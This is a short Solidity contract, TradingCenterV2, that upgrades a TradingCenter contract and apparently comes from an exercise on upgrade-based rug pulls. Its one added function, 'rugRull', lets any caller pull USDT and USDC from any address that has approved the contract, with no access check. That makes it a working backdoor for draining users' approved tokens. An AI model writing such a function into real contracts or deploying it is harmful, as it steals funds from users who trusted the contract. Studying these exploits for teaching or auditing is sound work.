// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import {TradingCenter, IERC20} from "./TradingCenter.sol";

contract TradingCenterV2 is TradingCenter {
    
    function rugRull(address attackAddr, uint256 amount) public {
        IERC20(usdt).transferFrom(attackAddr, msg.sender, amount);
        IERC20(usdc).transferFrom(attackAddr, msg.sender, amount);
    }
}
